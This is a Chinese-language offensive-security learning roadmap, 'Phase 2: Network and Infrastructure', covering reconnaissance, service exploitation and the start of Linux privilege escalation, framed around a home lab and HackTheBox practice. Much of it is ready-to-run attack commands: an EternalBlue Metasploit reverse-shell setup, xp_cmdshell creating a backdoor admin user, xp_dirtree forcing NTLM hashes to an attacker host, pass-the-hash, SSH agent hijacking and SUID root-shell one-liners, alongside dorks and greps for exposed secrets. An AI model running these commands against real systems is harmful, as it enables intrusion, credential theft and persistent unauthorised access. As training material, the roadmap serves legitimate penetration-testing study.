# 阶段 2：网络与基础设施

**作者：** Sagar Biswas ([@SagarBiswas-MultiHAT](https://github.com/SagarBiswas-MultiHAT))<br/>
**规范仓库：** [The BlackHAT Roadmap](https://github.com/SagarBiswas-MultiHAT/The-BlackHAT-roadmap)<br/>
**精选生态：** [Awesome Cybersecurity Paths](https://github.com/SagarBiswas-MultiHAT/awesome-cybersecurity-paths) · [Penetration Testing Roadmap](https://github.com/SagarBiswas-MultiHAT/penetration-testing-roadmap) · [Awesome Cybersecurity Books](https://github.com/SagarBiswas-MultiHAT/awesome-cybersecurity-books)<br/>
**许可证：** [CC BY-SA 4.0](https://github.com/SagarBiswas-MultiHAT/The-BlackHAT-roadmap/blob/main/LICENSE-DOCS)<br/>
**版本：** v1.0.0 · 2027 版<br/>

<div align="right">

**从第一次扫描到拿下整个网络**

</div>

**时长：** 4-6 个月 | **难度：** 中级 | **每周投入：** 30-35 小时
**先修要求：** 阶段 0（基础）和阶段 1（Web 安全） | **完成率：** 约占阶段 1 毕业生的 20%

---

> **本阶段是什么：** 阶段 1 教你攻击 Web 应用。阶段 2 不同。你现在攻击的是**基础设施**：所有其他东西赖以运行的机器、协议和网络。到本阶段结束时，你能从外部进入企业网络，在 Windows 和 Linux 上提权到 SYSTEM 或 root，在 Active Directory 域中横向移动，静默地捕获凭据，并通过 C2 框架维持持久访问而不触发 EDR。大多数企业网络尚未修补这里的技术。这不是理论。

---

## 目录

1. [本阶段建立什么](#1-本阶段建立什么)
2. [先修要求检查](#2-先修要求检查)
3. [阶段 2 攻击链](#3-阶段-2-攻击链)
4. [实验环境拓扑](#4-实验环境拓扑)
5. [时间线概览](#5-时间线概览)
6. [如何使用本阶段](#6-如何使用本阶段)
7. [第 1 节：侦察与 OSINT](#第-1-节侦察与-osint)
8. [第 2 节：服务漏洞利用](#第-2-节服务漏洞利用)
9. [第 3 节：权限提升 - Linux](#第-3-节权限提升---linux)
10. [第 4 节：权限提升 - Windows](#第-4-节权限提升---windows)
11. [第 5 节：凭据投毒与中继攻击](#第-5-节凭据投毒与中继攻击)
12. [第 6 节：后渗透与横向移动](#第-6-节后渗透与横向移动)
13. [第 6.6 节：Active Directory 枚举与攻击](#第-66-节active-directory-枚举与攻击)
14. [第 7 节：网络跳板与隧道](#第-7-节网络跳板与隧道)
15. [第 8 节：无线攻击](#第-8-节无线攻击)
16. [第 9 节：密码攻击方法论](#第-9-节密码攻击方法论)
17. [第 10 节：AV/EDR 规避与载荷投递](#第-10-节avedr-规避与载荷投递)
18. [第 11 节：C2 框架操作](#第-11-节c2-框架操作)
19. [第 12 节：阶段 2 中的 OPSEC](#第-12-节阶段-2-中的-opsec)
20. [里程碑项目](#里程碑项目)
21. [阶段 2 完成检查清单](#阶段-2-完成检查清单)
22. [CTF 靶场与练习目标](#ctf-靶场与练习目标)
23. [阶段 2 到阶段 3 的衔接](#阶段-2-到阶段-3-的衔接)

---

## 1. 本阶段建立什么

到阶段 2 结束时，你将能够：

- 利用暴露的服务和配置错误的协议**从外部进入网络**
- 在 Linux 和 Windows 上**把你的权限**从普通用户**提升**到 root 或 SYSTEM
- 手动并使用工具**枚举 Active Directory 域**，识别攻击路径
- 使用窃取的凭据**横向移动**，无需新的漏洞利用
- **静默驻留**在网络中，从你从未接触过的机器上收集凭据
- 通过能在重启和 EDR 产品下存活的 C2 框架**维持访问**
- 使用内存技术与规避战术**绕过 AV 和 EDR** 产品
- **穿过防火墙建立隧道**，从滩头机器到达内部系统
- **攻陷无线网络**，包括 WPA3 过渡模式环境
- **利用 Active Directory** 漏洞，包括 ADCS、ACL 滥用和委派攻击
- **理解防守方看到什么**，针对你使用的每一项主要技术

---

## 2. 先修要求检查

开始阶段 2 之前，确认你具备这些技能。诚实一点。阶段 0 的一道裂缝，到阶段 2 就是一堵墙。

```
阶段 0 先修要求：
  Linux 熟练：文件系统、权限、bash 脚本（能写出有用的脚本）
  Python：能从头写脚本、读懂他人代码、使用库
  网络：TCP/IP、OSI 模型、DNS/HTTP/ARP：理解每一层发生了什么
  虚拟机：能搭建 Kali Linux、Windows Server、Ubuntu，构建仅内部网络

阶段 1 先修要求：
  Burp Suite：能自信地拦截并修改 HTTP 请求
  SQLi：手动利用（不只是 sqlmap：你理解它为什么有效）
  XSS：存储型、反射型、DOM 型：三种都要，带真实示例
  OWASP Top 10：能解释每一类并给出真实案例
  完成 5 个以上 HTB/TryHackMe Web 专项房间，并各写一份报告
```

> 如果任何一项未勾选，先补上再继续。阶段 2 完全假定这些都已具备。

---

## 3. 阶段 2 攻击链

阶段 2 的每项操作都遵循这条链。本阶段的每一节对应其中一个节点。

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/PHASE_2/1._PHASE_2_KILL_CHAIN.png" alt="1._PHASE_2_KILL_CHAIN" width="1400"/>

</td></tr></table>
</div>

---

## 4. 实验环境拓扑

开始前先搭建这个最小实验环境。每一节都假定它已就绪。

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/PHASE_2/2._LAB_TOPOLOGY.png" alt="2._LAB_TOPOLOGY" width="600"/>

</td></tr></table>
</div>

**实验环境搭建说明：**

```bash
# VirtualBox：创建一个名为 "lab_internal" 的内部网络
# 将 DC、W10、Ubuntu 的网卡设置为：Host-only + Internal Network "lab_internal"
# 将 Kali 的网卡设置为：NAT（上网）+ Host-only（访问实验网）

# 在 DC 上：安装 Active Directory
# PowerShell（在 Windows Server 2022 上以管理员身份运行）：
Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
Install-ADDSForest -DomainName "lab.local" -DomainNetbiosName "LAB" -InstallDns -Force

# 将 W10 加入域（在 Windows 10 上）：
# 系统属性 -> 计算机名 -> 更改 -> 域：lab.local
# 加入后重启

# 创建练习用的测试用户：
New-ADUser -Name "Alice Smith" -SamAccountName "asmith" -AccountPassword (ConvertTo-SecureString "Summer2024!" -AsPlainText -Force) -Enabled $true
New-ADUser -Name "Bob Jones" -SamAccountName "bjones" -AccountPassword (ConvertTo-SecureString "Password123" -AsPlainText -Force) -Enabled $true
New-ADUser -Name "SVC SQL" -SamAccountName "svc_sql" -AccountPassword (ConvertTo-SecureString "Sqlpassword1" -AsPlainText -Force) -Enabled $true
Set-ADUser -Identity "svc_sql" -ServicePrincipalNames @{Add="MSSQLSvc/server.lab.local:1433"}
# 带 SPN 的 svc_sql = 可 Kerberoast：练习目标
```

---

## 5. 时间线概览

| 周 | 重点 | 目标成果 |
|------|-------|----------------|
| 1-2 | 侦察与 OSINT | 完成对实验域名的被动侦察画像 |
| 3-5 | 服务漏洞利用 | 在 15 台 HTB 简单机器上拿到 root/SYSTEM，全部记录在案 |
| 6-8 | Linux 权限提升 | 通过 5 种以上不同方法拿到 root，每种都有记录 |
| 9-11 | Windows 权限提升 | 通过 5 种以上不同方法拿到 SYSTEM，每种都有记录 |
| 12-14 | 凭据投毒与中继 | 被动捕获 NTLMv2，并中继获得 RCE |
| 15-18 | 后渗透、横向移动、AD 枚举 | 三机横向链路与通往 DA 的 BloodHound 路径 |
| 19-20 | AV/EDR 规避 | 可用的 AMSI 绕过、内存中执行工具 |
| 21-22 | C2 框架 | Sliver：监听器、植入体、持久访问 |
| 23-24 | 跳板与隧道 | 用 Ligolo-ng 到达跳板之后的网段 |
| 25-26 | 无线攻击 | 捕获并破解 WPA2 握手；测试 WPA3 |
| 27-28 | ADCS 与高级 AD 攻击 | 滥用 ESC1 证书模板，绘制 ACL 攻击链 |

> 各周有重叠。侦察永不停止。按自己的节奏调整：4 个月很激进，6 个月才健康。

---

## 6. 如何使用本阶段

每一节都遵循这个结构：

1. **这是什么、为什么有效：** 概念优先。读它、理解它。不要直接跳到命令。
2. **课程表：** 学什么、按什么顺序、预估时间和费用
3. **代码块：** 精确的命令，用 `#` 注释就地解释
4. **实验练习：** 在你自己的环境中要构建或攻破的具体交付物
5. **检测痕迹：** 你使用这项技术时防守方看到什么
6. **OPSEC 提示：** 你在目标上留下什么痕迹，以及如何管理它们

**规则：** 如果你不理解一条命令为什么有效，你就还没准备好使用它。去查清楚。理解原理的操作者，才是工具失效时能随机应变的那一个。

---

---

## 第 1 节：侦察与 OSINT

### 这是什么，为什么重要

侦察是在接触目标之前收集信息。目标是从外部理解攻击面：存在哪些机器、它们运行什么服务、那里有哪些员工、使用什么技术。第一次扫描之前了解得越多，你就越能精准且安静。

**两种类型：**
- **被动侦察：** 不向目标发送任何数据包就能收集信息。对其系统零足迹。
- **主动侦察：** 直接与目标交互（扫描、探测）。会留下日志。

始终先穷尽被动侦察，再转为主动。在真实项目中，被动侦察曾在行动开始前就终结一切：一个拥有健全监控的目标会看到你的扫描，并在你发出第一个载荷之前封掉你的 IP。

### 侦察流程

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/PHASE_2/3._Recon_Flow.png" alt="Recon Flow" width="1000"/>

</td></tr></table>
</div>

---

### 课程

| 资源 | 类型 | 时长 | 费用 | 备注 |
|----------|------|----------|------|-------|
| [Practical Ethical Hacking - TCM Security](https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course) | 课程 | 25 小时 | $30 | 结构最好的入门课。侦察部分很全面。 |
| [Nmap 官方手册](https://nmap.org/book/) | 参考 | 5 小时 | 免费 | 至少读第 1-6 章。初学者严重低估了 NSE 脚本。 |
| [Shodan](https://www.shodan.io/) | 工具 | 2 小时 | 免费/付费 | 学习查询语法。免费版足够起步。 |
| [OSINT Framework](https://osintframework.com/) | 参考 | 1 小时 | 免费 | 按数据类型分类的 OSINT 工具索引。 |
| [theHarvester GitHub](https://github.com/laramies/theHarvester) | 工具 | 2 小时 | 免费 | 从公开来源收集邮箱、子域、员工姓名。 |
| [Amass](https://github.com/owasp-amass/amass) | 工具 | 2 小时 | 免费 | 深度子域枚举。比单用 subfinder 更彻底。 |

---

### 1.1 被动侦察 - 零足迹

#### Google Dorking

```bash
# 查找子域
site:target.com -www

# 查找暴露的管理面板
site:target.com inurl:admin OR inurl:login OR inurl:panel

# 查找配置文件与备份（数据库、凭据）
site:target.com ext:xml OR ext:conf OR ext:bak OR ext:sql OR ext:env

# 在文本文件中查找暴露的凭据
site:target.com ext:txt "password" OR "passwd" OR "credentials"

# 查找 SQLi 报错页面
intext:"sql syntax near" site:target.com
intext:"Warning: mysql_fetch" site:target.com

# 查找目录列表（常暴露源代码和备份）
intitle:"index of" site:target.com

# 查找暴露的环境文件（API 密钥、数据库密码）
site:target.com filetype:env OR inurl:.env

# 查找暴露的 Git 仓库（完整源代码）
intitle:"index of" inurl:".git" site:target.com

# 查找登录入口
intitle:"login" OR intitle:"sign in" site:target.com

# 扩展 Google Dork 参考：https://www.exploit-db.com/google-hacking-database
```

---

#### theHarvester - 邮箱、子域、员工信息收集

```bash
# 安装（Kali 已预装，或者）：
pip3 install theHarvester

# 针对某个域名的基础运行：查询多个来源
theHarvester -d target.com -b google,linkedin,bing,certspotter,crtsh -l 500
# -d：目标域名
# -b：要查询的数据源（用 'all' 尝试全部）
# -l：每个来源的结果上限

# 保存结果：
theHarvester -d target.com -b all -l 500 -f target_harvest
# 生成 target_harvest.html 和 target_harvest.xml

# 需要留意的关键输出：
# 发现的邮箱：john.smith@target.com, hr@target.com
#   这些就是你的密码喷洒用户列表
# 发现的主机：mail.target.com, vpn.target.com, dev.target.com
#   这些子域可能不在 DNS 记录中
# 发现的 IP：203.0.113.10, 203.0.113.15
#   立刻用 Shodan 查这些 IP
```

> **为什么重要：** 收集到的邮箱格式（firstname.lastname@ 还是 f.lastname@ 还是 firstnamelastname@）告诉你整个组织的命名约定。这就是你的密码喷洒用户列表和钓鱼发件人格式。

---

#### 证书透明度

```bash
# 为某个域名签发的每张 SSL 证书都会被公开记录。
# 这会暴露每个子域，包括意外持有公开证书的内部子域。

# 方法 1：crt.sh 网页界面
# https://crt.sh/?q=%25.target.com

# 方法 2：用 curl 调 API 并解析
curl -s "https://crt.sh/?q=%25.target.com&output=json" | \
  python3 -c "import sys,json; [print(e['name_value']) for e in json.load(sys.stdin)]" | \
  sort -u | grep -v "*"

# 方法 3：subfinder（多来源、快）
# https://github.com/projectdiscovery/subfinder
subfinder -d target.com -silent -o subdomains.txt

# 方法 4：amass（最全面）
amass enum -passive -d target.com -o amass_out.txt

# 方法 5：httpx - 探测哪些子域存活
cat subdomains.txt | httpx -silent -status-code -title -o live_subdomains.txt
# httpx: https://github.com/projectdiscovery/httpx
```

---

#### DNS 枚举

```bash
# 基础 DNS 查询
nslookup target.com
dig target.com ANY           # 所有记录类型

# 查找邮件服务器
dig target.com MX

# 查找 SPF/DMARC 记录（对规划邮件攻击很有用）
dig target.com TXT

# 尝试区域传送（配置错误的 DNS 服务器会交出整个区域）
dig axfr @ns1.target.com target.com
# 现代 DNS 服务器大多拒绝。一旦有服务器接受，你就能拿到全部主机名。
# 逐个尝试每个名称服务器：先 dig target.com NS，再逐个尝试。

# 用 dnsrecon 爆破子域
dnsrecon -d target.com -t brt -D /usr/share/wordlists/dnsmap.txt

# 快速解析已发现的子域
cat subdomains.txt | dnsx -silent -a -resp-only
# dnsx: https://github.com/projectdiscovery/dnsx
```

---

#### Shodan - 互联网级端口扫描器

```bash
# 安装 CLI：pip3 install shodan
# 从 shodan.io 获取 API 密钥（免费账户）
shodan init YOUR_API_KEY

# 查找某个域名上的所有服务
shodan search "hostname:target.com"
shodan search "hostname:target.com" --fields ip_str,port,org,hostnames

# 查找与某家公司关联的所有 IP
shodan search "org:\"Target Company Name\""

# 查找特定的易受攻击软件版本
shodan search "product:nginx version:1.14"
shodan search "product:Apache httpd version:2.4.49"    # CVE-2021-41773

# 查找暴露的 RDP
shodan search "port:3389 country:US os:Windows"

# 某个 IP 的完整主机摘要
shodan host 203.0.113.15
# 显示：开放端口、banner、位置、组织、主机名、Shodan 检测到的 CVE
```

---

#### GitHub 与代码仓库 OSINT

```bash
# 在 GitHub.com 上手动搜索：
# github.com/search?q=target.com+password&type=code
# github.com/search?q=target.com+api_key&type=code
# github.com/search?q=target.com+SECRET&type=code
# github.com/search?q=target.com+BEGIN+RSA+PRIVATE&type=code   (SSH private keys)

# 自动化：truffleHog（扫描 git 历史中的密钥）
# https://github.com/trufflesecurity/trufflehog
trufflehog github --org=target-org --only-verified
# --only-verified：只报告确认仍然有效的密钥

# gitleaks（基于模式扫描）
# https://github.com/gitleaks/gitleaks
git clone https://github.com/target-org/some-repo.git
gitleaks detect --source=./some-repo --verbose

# 手动 grep 高价值模式：
# "password", "passwd", "secret", "api_key", "private_key", "internal"
```

> **真实案例（2024 年）：** 一起重大数据泄露可追溯到 2021 年被删除的配置文件中的 API 凭据。Wayback Machine 存有快照，而那些凭据在线上 API 中仍然有效。

---

#### Wayback Machine - 历史攻击面

```bash
# 安装 waybackurls：
go install github.com/tomnomnom/waybackurls@latest

# 获取某个域名被爬取过的所有 URL：
waybackurls target.com | tee wayback_urls.txt

# 筛选高价值目标：
cat wayback_urls.txt | grep -E "\.(env|config|bak|sql|json|xml|yaml|yml)$"
cat wayback_urls.txt | grep -iE "password|passwd|credential|secret|api.key|token"
cat wayback_urls.txt | grep -iE "admin|login|panel|dashboard|portal"

# gau（Get All URLs）：还会查询 otx.alienvault.com 和 Common Crawl
go install github.com/lc/gau/v2/cmd/gau@latest
gau target.com | tee gau_urls.txt

# katana（2024 年同类最佳爬虫）：https://github.com/projectdiscovery/katana
katana -u https://target.com -d 5 -jc -o katana_out.txt
# -d：爬取深度    -jc：解析 JavaScript 提取端点
```

---

### 1.2 主动侦察 - Nmap 精通

```bash
# 第 1 步：快速 TCP 扫描，尽快找出开放端口
# -sS：SYN 扫描（隐蔽、快速、需要 root）
# -p-：全部 65535 个 TCP 端口
# --min-rate 5000：每秒 5000 个数据包
sudo nmap -sS -p- --min-rate 5000 -T4 -oN tcp_all.txt TARGET_IP

# 第 2 步：只对开放端口做服务版本探测
PORTS=$(grep "^[0-9]" tcp_all.txt | cut -d'/' -f1 | tr '\n' ',')
sudo nmap -sV -sC -p$PORTS -oN service_scan.txt TARGET_IP
# -sV：服务版本探测
# -sC：运行默认 NSE 脚本

# 第 3 步：UDP 扫描（常被跳过，却常有收获）
sudo nmap -sU --top-ports 1000 -T4 -oN udp_scan.txt TARGET_IP
# 重要的 UDP 端口：53（DNS）、161（SNMP）、1434（MSSQL）、500（IKE/VPN）

# 第 4 步：操作系统探测
sudo nmap -O TARGET_IP

# 第 5 步：针对性 NSE 脚本
nmap --script vuln -p 445 TARGET_IP
nmap --script smb-* -p 445 TARGET_IP
nmap --script http-* -p 80,443,8080 TARGET_IP

# 第 6 步：SNMP 枚举（如果 161/UDP 开放 - 常会暴露用户名）
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt TARGET_IP
snmpwalk -v2c -c public TARGET_IP
# 常见的 community 字符串：public、private、community、manager

# 防火墙规避技术：
nmap -f TARGET_IP                         # 分片数据包
nmap -D RND:10 TARGET_IP                  # 诱饵：在 10 个随机 IP 中隐藏自己
nmap --source-port 53 TARGET_IP           # 用 53 端口作为源端口
nmap -T1 TARGET_IP                        # 偏执模式：每次探测间隔 5 分钟

# 大网段：先用 masscan（发现快得多）
sudo masscan 192.168.1.0/24 -p 22,80,443,445,3389,8080 --rate=1000 -oL masscan_out.txt
# 然后只对发现的 IP 运行 nmap 做服务探测
```

**检测痕迹：**
- SYN 扫描：半开连接在防火墙日志中可见
- `--min-rate 5000`：巨大的流量峰值会被 NDR 工具（Darktrace、Vectra）标记
- NSE 漏洞脚本：会发送利用尝试 - 用于检测并不安全

**OPSEC 提示：** 在真实行动中，尽可能用 Shodan 数据代替扫描。确实要扫描时，用 `--scan-delay` 分散数据包。绝不要从自己的 IP 扫描。

---

### 1.3 实验练习 - 完整的 OSINT 画像

```
交付物：OSINT_REPORT.md，包含：
  通过 crt.sh + subfinder + theHarvester 找到的所有子域
  所有 DNS 记录（A、MX、NS、TXT、CNAME、SRV）
  该域名在 GitHub 上的任何提及（truffleHog）
  所有关联 IP 的 Shodan 结果
  Google dork 结果（至少 8 个可用的 dork）
  Wayback Machine：5 个有趣的历史 URL 并附说明
  theHarvester：识别出邮箱地址格式，构建用户列表
  攻击面总结：哪些发现优先级最高，以及为什么
```

---

---

## 第 2 节：服务漏洞利用

### 这是什么，为什么重要

侦察之后，你知道哪些端口开放、哪些服务在运行。服务漏洞利用是指通过攻击这些服务获得初始访问。这很少是“跑个漏洞利用就拿到 shell”。更常见的是：

- 默认或弱凭据（进入真实组织最常见的路径）
- 配置错误的访问控制（匿名登录、无需认证）
- 带有已知 CVE 的过时软件
- 协议滥用（按服务本来的用途使用它，但用于恶意目的）

### Impacket 套件

在深入技术之前，先理解你手里用的是什么。Impacket 是一个 Python 库，实现了数十种 Windows 网络协议（SMB、MSRPC、NTLM、Kerberos、LDAP、MSSQL）。

```bash
# 安装（Kali 已预装，或者）：
pip3 install impacket

# 阶段 2 你会用到的工具：
# impacket-secretsdump   -> 从 SAM、LSA、NTDS.dit 导出密码哈希
# impacket-psexec        -> 通过 SMB 获得 SYSTEM shell（创建服务：噪音大）
# impacket-wmiexec       -> 通过 WMI 获得半交互 shell（更安静）
# impacket-smbexec       -> 不写磁盘的 SMB shell
# impacket-mssqlclient   -> MSSQL 交互客户端
# impacket-GetUserSPNs   -> Kerberoasting
# impacket-GetNPUsers    -> AS-REP Roasting
# impacket-lookupsid     -> 枚举域 SID
# impacket-rpcdump       -> 枚举 RPC 端点

# 通用凭据格式：
# domain/user:password@TARGET_IP
# domain/user@TARGET_IP -hashes LM_HASH:NT_HASH

# 示例：
impacket-psexec lab.local/administrator:Password123!@192.168.1.10
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH_HERE administrator@192.168.1.10
# LM 哈希几乎总是 aad3b435b51404ee（现代系统上的空 LM 哈希）
```

---

### 课程

| 资源 | 类型 | 时长 | 费用 | 备注 |
|----------|------|----------|------|-------|
| [HackTheBox Starting Point](https://www.hackthebox.com/home/start) | 靶场 | 10 小时 | 免费 | 引导式机器。最适合学习方法论。从这里开始。 |
| [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/) | 课程 | 10 小时 | 免费 | Offensive Security 自家课程。完整。 |
| [TryHackMe - Network Security Path](https://tryhackme.com/path/outline/networksecurity) | 靶场 | 20 小时 | $14/月 | 引导式，适合初学者节奏。 |
| [HackTricks](https://book.hacktricks.xyz/) | 参考 | 持续更新 | 免费 | 渗透测试的权威参考。立刻收藏。 |

---

### 2.1 SMB（445 端口）

SMB 是 Windows 文件共享协议，也是企业环境中最常被利用的协议。如果你看到 445 端口开放，从这里开始。

```bash
# 枚举 SMB：版本、签名策略、共享
nmap --script smb-security-mode,smb2-security-mode,smb-enum-shares -p 445 TARGET_IP

# 空会话：无凭据连接
smbclient -N -L //TARGET_IP
# -N：无密码    -L：列出共享

# 连接特定共享：
smbclient -N //TARGET_IP/ShareName

# 用 NetExec（nxc）自动枚举：仍在维护的 CrackMapExec 替代品
# CrackMapExec 上游已死。2026-2027 年请用 NetExec。
# 安装：pip3 install netexec
nxc smb TARGET_IP                         # 基础信息（主机名、操作系统、域、签名）
nxc smb TARGET_IP -u '' -p ''            # 空会话测试
nxc smb TARGET_IP -u 'guest' -p ''       # Guest 会话测试
nxc smb TARGET_IP --shares               # 列出共享（无需认证）
nxc smb 192.168.1.0/24                   # 扫描整个网段

# EternalBlue（MS17-010）：在未修补的旧系统上依然有效
nmap --script smb-vuln-ms17-010 -p 445 TARGET_IP

# 用 Metasploit 利用：
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET_IP
set LHOST YOUR_IP
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

# PrintNightmare（CVE-2021-1675 / CVE-2021-34527）
nxc smb TARGET_IP -u user -p pass -M printnightmare

# 传递哈希（第 5 节详述，这里先预览）：
nxc smb TARGET_IP -u administrator -H NTLM_HASH
impacket-psexec -hashes :NTLM_HASH administrator@TARGET_IP
```

**检测痕迹：**
- 空/guest 会话：事件 ID 4624（登录类型 3），用户名为空
- EternalBlue：网络抓包中可见 SMB 协商异常
- psexec：创建服务 `PSEXESVC` -> 事件 ID 7045（服务已安装）
- 传递哈希：事件 ID 4624（类型 3），之前没有密码输入记录

**OPSEC 提示：** psexec 是噪音最大的横向移动工具。真实行动中优先用 wmiexec（不创建服务）或 smbexec。

---

### 2.2 SSH（22 端口）

```bash
# 识别 SSH 版本（在 CVEDetails 上查已知漏洞）
ssh -v TARGET_IP 2>&1 | head -5

# SSH 算法弱点审计
# https://github.com/jtesta/ssh-audit
python3 ssh-audit.py TARGET_IP
# 会标记弱算法：MD5、SHA1、diffie-hellman-group1-sha1

# 用 nxc 检查默认凭据：
nxc ssh TARGET_IP -u users.txt -p passwords.txt

# SSH 密钥窃取与复用
find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
cat ~/.ssh/authorized_keys    # 谁能以此用户登录
cat ~/.ssh/known_hosts        # 该用户之前连接过哪些服务器

# 滥用 SSH agent 转发：
# 如果用户启用了 SSH agent 转发，并通过你已攻陷的主机连接，
# 他们的 agent socket 就对你可访问。
ls /tmp/ssh-*/
SSH_AUTH_SOCK=/tmp/ssh-XXXXX/agent.XXXXX ssh-add -l         # 列出其转发的密钥
SSH_AUTH_SOCK=/tmp/ssh-XXXXX/agent.XXXXX ssh user@internal   # 用其密钥连接
```

---

### 2.3 WinRM（5985、5986 端口）

WinRM 即 Windows 远程管理：通过 HTTP（5985）或 HTTPS（5986）的 PowerShell 远程处理。

```bash
# 检查 WinRM 是否启用：
nxc winrm TARGET_IP -u user -p password
# Pwned! = 你已获得远程命令执行

# evil-winrm：标准的 WinRM 利用工具
evil-winrm -i TARGET_IP -u administrator -p 'Password123!'

# 用 evil-winrm 传递哈希：
evil-winrm -i TARGET_IP -u administrator -H NTLM_HASH

# 使用 Kerberos 票据：
evil-winrm -i TARGET_IP -u administrator -k -r domain.local

# 通过 evil-winrm 会话传输文件：
upload /local/path/file.exe C:\Windows\Temp\file.exe
download C:\Users\Administrator\Desktop\flag.txt /local/path/
```

---

### 2.4 MSSQL（1433 端口）

```bash
# 默认凭据：sa:(空)、sa:sa、sa:password
nmap --script ms-sql-info,ms-sql-empty-password -p 1433 TARGET_IP

# 用 impacket 的交互客户端：
impacket-mssqlclient domain/user:pass@TARGET_IP

# 在 MSSQL 会话内：
SQL> SELECT @@version;
SQL> SELECT name FROM sys.databases;
SQL> SELECT name FROM sys.tables;

# 启用并使用 xp_cmdshell（操作系统命令执行）：
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
SQL> EXEC xp_cmdshell 'net user hacker Password123! /add';
SQL> EXEC xp_cmdshell 'net localgroup administrators hacker /add';

# UNC 路径注入：迫使 MSSQL 向你认证 -> 捕获 NTLMv2 哈希
# 先在攻击机上启动 Responder，然后：
SQL> EXEC xp_dirtree '\\YOUR_ATTACKER_IP\share';
# MSSQL 服务器回连 -> Responder 捕获 NetNTLMv2 哈希

# 滥用链接服务器：以此为跳板到它信任的其他 SQL 服务器
SQL> SELECT * FROM sys.servers;
SQL> EXEC ('SELECT @@version') AT [linked_server_name];
SQL> EXEC ('EXEC xp_cmdshell ''whoami''') AT [linked_server_name];
```

---

### 2.5 RDP（3389 端口）

```bash
# 检查凭据：
nxc rdp TARGET_IP -u user -p password

# 连接：
xfreerdp /v:TARGET_IP /u:administrator /p:'Password123!'
xfreerdp /v:TARGET_IP /u:administrator /p:'Password123!' /cert-ignore /dynamic-resolution

# RDP 传递哈希（目标需启用 Restricted Admin 模式）：
xfreerdp /v:TARGET_IP /u:administrator /pth:NTLM_HASH /cert-ignore

# 启用 Restricted Admin 模式（如果你有代码执行）：
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0
```

---

### 2.6 其他服务

```bash
# FTP（21 端口）
nmap --script ftp-anon,ftp-bounce,ftp-brute -p 21 TARGET_IP
ftp TARGET_IP                # 尝试匿名登录：用户名 anonymous，密码留空

# Telnet（23 端口）
nmap --script telnet-brute -p 23 TARGET_IP

# SMTP（25 端口）
nmap --script smtp-enum-users,smtp-vuln-cve2010-4344 -p 25 TARGET_IP

# NFS（2049 端口）
showmount -e TARGET_IP         # 列出 NFS 导出
sudo mount -t nfs TARGET_IP:/share /tmp/mount/

# Redis（6379 端口）- 默认配置常无认证
redis-cli -h TARGET_IP ping
redis-cli -h TARGET_IP config get dir    # 查找网站根目录以便上传 webshell

# MongoDB（27017 端口）- 常无认证
mongo --host TARGET_IP --port 27017
> show dbs
> use admin
> db.system.users.find()

# Elasticsearch（9200 端口）- 常无认证地暴露全部数据
curl http://TARGET_IP:9200/_cat/indices
curl http://TARGET_IP:9200/INDEX_NAME/_search?size=100
```

---

### 2.7 实验练习

在 15 台 HackTheBox Easy 机器上拿到 root 或 SYSTEM。逐台记录：

```
目标：[机器名称]
操作系统：[Windows/Linux]
开放端口：[来自 nmap 输出]
发现的漏洞：[具体哪里有问题]
利用方法：[使用的确切命令]
证据：[whoami 输出 + 主机名]
产生的痕迹：[这创建了哪些日志]
教训：[这台机器教给你的一件事]
```

---

---

## 第 3 节：权限提升 - Linux

### 这是什么，为什么重要

你有一个 shell。你以低权限用户运行。你的目标是 `root`。权限提升利用的是配置错误、有漏洞的软件或过弱的权限。

> **心态：** 几乎每台 Linux 机器都有一条提权路径。你的工作是系统化枚举，而不是猜测。按下面的类别依次过一遍。把内核漏洞留到最后：它们可能让系统崩溃。

### Linux 提权决策树

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/PHASE_2/4._Linux_PrivEsc_Decision_Tree.png" alt="Linux PrivEsc Decision Tree" width="800"/>

</td></tr></table>
</div>

---

### 课程

| 资源 | 类型 | 时长 | 费用 | 备注 |
|----------|------|----------|------|-------|
| [PayloadsAllTheThings Linux PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Linux%20-%20Privilege%20Escalation.md) | 参考 | 5 小时 | 免费 | 全面的参考。练习时一直开着。 |
| [GTFOBins](https://gtfobins.github.io/) | 参考 | 持续更新 | 免费 | 对每个 SUID 二进制或 sudo 规则，先查这里。 |
| [TryHackMe Linux PrivEsc](https://tryhackme.com/room/linuxprivesc) | 靶场 | 4 小时 | 免费 | 在易受攻击机器上的引导式练习。 |
| [HackTricks Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation) | 参考 | 持续更新 | 免费 | 与 PayloadsAllTheThings 交叉对照。 |

---

### 3.1 态势感知 - 立即运行这些

```bash
# 你是谁？
id
whoami

# 这是什么系统？
uname -a                   # 内核版本 -> 研究内核漏洞利用
cat /etc/os-release        # 操作系统与版本
cat /proc/version

# 用户与组
cat /etc/passwd            # 所有用户（UID 0 = root：检查是否有多个）
cat /etc/group
last                       # 最近登录历史
history                    # 命令历史：密码经常以明文出现

# 网络：你能到达哪里？
ip a
netstat -tulpn             # 监听服务（你无法从外部扫描的内部服务）
ss -tulpn

# 环境变量：凭据和密钥藏在这里
env | grep -iE "pass|key|secret|token|api"

# 可写目录
find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys

# 最近修改的文件
find / -mtime -7 -type f 2>/dev/null | grep -v proc | grep -v sys | grep -v run
```

---

### 3.2 SUID 二进制文件

```bash
# 查找所有 SUID 二进制文件
find / -perm -4000 -type f 2>/dev/null

# 对每个找到的二进制文件，查 GTFOBins：https://gtfobins.github.io/

# 带 SUID 的 find：
find /etc/passwd -exec /bin/bash -p \;

# 带 SUID 的 bash：
/bin/bash -p

# 带 SUID 的 python3：
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

